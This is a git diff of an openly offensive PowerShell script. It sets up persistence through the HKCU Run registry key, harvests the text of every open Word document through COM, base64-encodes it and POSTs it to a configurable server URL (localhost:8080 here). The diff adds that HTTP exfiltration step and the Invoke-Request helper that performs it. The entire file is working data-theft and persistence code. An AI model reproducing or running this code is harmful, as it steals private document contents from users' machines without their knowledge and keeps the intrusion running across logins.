@@ -1,4 +1,5 @@
 $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$ServerURL = "http://localhost:8080"
 
 function Set-RegistryPersistence {
 <#
@@ -13,7 +14,6 @@ Set-RegistryPersistence -Name "EntryName" -Command "ScriptToExecute"
 #>
 
     Param (
-                
         [Parameter(Mandatory = $true)]
         [String]
         [ValidateNotNullOrEmpty()]
@@ -23,7 +23,6 @@ Set-RegistryPersistence -Name "EntryName" -Command "ScriptToExecute"
         [String]
         [ValidateNotNullOrEmpty()]
         $Command
-        
     )
 
     New-ItemProperty -Path $RegistryPath -Name $Name -Value $Command -PropertyType String -Force | Out-Null
@@ -37,11 +36,10 @@ Remove persistence through the registry HKEY_CURRENT_USER\Software\Microsoft\Win
 .PARAMETER Name
 Indicates the name of the registry entry to delete.
 .EXAMPLE
-Remove-LocalSecurityPolicy -Name "EntryToDelete"
+Remove-LocalSecurityPolicy -Name "EntryToDelete".
 #>
 
     Param (
-                    
         [Parameter(Mandatory = $true)]
         [String]
         [ValidateNotNullOrEmpty()]
@@ -58,7 +56,17 @@ function Get-OpenWORDDocumentsWords {
 Retrieve all WinWords open documents, get the title, the document path and exfiltrates all written words in base64
 .EXAMPLE
 Get-OpenWordDocumentsWords
+.PARAMETER URL
+Indicates the URL of the server to exfiltrate the data.
 #>
+    
+    Param (       
+        [Parameter(Mandatory = $true)]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $URL
+    )
+
     try {
         $WordDocuments = [Runtime.Interopservices.Marshal]::GetActiveObject('Word.Application')
     }
@@ -66,21 +74,61 @@ Get-OpenWordDocumentsWords
 
     }
     finally {
-        foreach ($Word in $WordDocuments.Documents) {
+        foreach ($WordDoc in $WordDocuments.Documents) {
             
-            $Exfil = "##-BEGIN-##" + "`n" + "Word_File: " + $Word.Name + "`n" + "Document_path: " + $Word.FullName + "`n" + "Words: " + "`n"
+            $Exfil = "##-BEGIN-##" + "`n" + "Word_File: " + $WordDoc.Name + "`n" + "Document_path: " + $WordDoc.FullName + "`n" + "Words: " + "`n"
                     
-            foreach ($Paragraph in $Word.Paragraphs) {
-                if ($null -ne $Paragraph.range.Text) {
-                    $Exfil += $Paragraph.range.Text
-                }
+            foreach ($Word in $WordDoc.Words) {
+                if ($null -ne $Word.Text){
+                    #clear non ascii chars
+                    $Exfil += $Word.Text -replace '[^\x30-\x39\x41-\x5A\x61-\x7A]+', ''
+                    $Exfil += " "
+                }                
             }
-            $Exfil += "##-END-##"
-            $b  = [System.Text.Encoding]::UTF8.GetBytes($exfil)
+
+            $Exfil += "`n" + "##-END-##"
+            $b  = [System.Text.Encoding]::UTF8.GetBytes($Exfil)
             $EncodedData = [System.Convert]::ToBase64String($b)
-            Write-Host $EncodedData
+            Invoke-Request -URL $URL -Body $EncodedData | Out-Null
         }
+    }
+
+    try {
+        [Runtime.Interopservices.Marshal]::ReleaseComObject('Word.Application')
+    }
+    catch {
+
     }
 }
 
-Get-OpenWORDDocumentsWords
+function Invoke-Request {
+<#
+.SYNOPSIS
+Make a POST Request to specified URL to exifltrate data.
+.PARAMETER URL
+Indicates the URL of the server to make the request.
+.PARAMETER Body
+Indicates the body of the request
+.EXAMPLE
+Invoke-Request -URL "ServerURL".
+#>
+
+    Param (
+                        
+        [Parameter(Mandatory = $true)]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $URL,
+
+        [Parameter(Mandatory = $true)]
+        [String]
+        [ValidateNotNullOrEmpty()]
+        $Body
+
+    )
+
+    Invoke-WebRequest -Method 'Post' -Uri $URL -Body $Body
+
+}
+
+Get-OpenWORDDocumentsWords -URL $ServerURL
